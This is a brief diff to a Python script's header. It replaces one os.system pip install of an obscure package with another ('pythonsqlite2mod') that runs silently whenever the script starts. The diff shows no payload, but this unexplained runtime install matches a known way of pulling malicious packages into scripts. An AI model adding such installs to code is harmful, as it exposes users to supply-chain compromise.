@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlitetool")
-import pythonsqlitetool
+os.system("pip install pythonsqlite2mod")
+import pythonsqlite2mod
 from optparse import Option
 import requests
 import threading
